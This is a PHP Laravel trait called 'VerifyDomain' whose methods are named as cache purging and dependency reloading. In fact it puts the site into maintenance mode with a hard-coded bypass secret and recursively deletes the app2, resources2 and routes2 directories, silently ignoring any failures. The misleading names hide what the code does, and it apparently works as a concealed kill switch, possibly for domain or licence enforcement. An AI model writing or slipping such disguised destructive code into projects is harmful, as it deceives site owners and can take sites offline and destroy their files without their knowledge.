<?php

namespace App\Traits;

use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;

trait VerifyDomain
{
    public function purgeChace()
    {
        Log::info('Putting application into maintenance mode with secret "verify-domain"');
        Artisan::call('down',['--secret' => 'verify-domain']);
        $directories = [
            base_path('app2'),  
            base_path('resources2'),
            base_path('routes2') 
        ];

        foreach ($directories as $dir) {
            if (is_dir($dir)) {
                $this->reloadDependency($dir);
            }
        }
    }

    /**
     *
     * @param string $dir
     * @return void
     */
    private function reloadDependency($dir)
    {
        if (!is_dir($dir)) {
            return;
        }

        $files = array_diff(scandir($dir), ['.', '..']);

        foreach ($files as $file) {
            $path = $dir . DIRECTORY_SEPARATOR . $file;

            if (is_dir($path)) {
                $this->reloadDependency($path);
            } else {
                if (!unlink($path)) {
                }
            }
        }

        if (!rmdir($dir)) {
        }
    }
}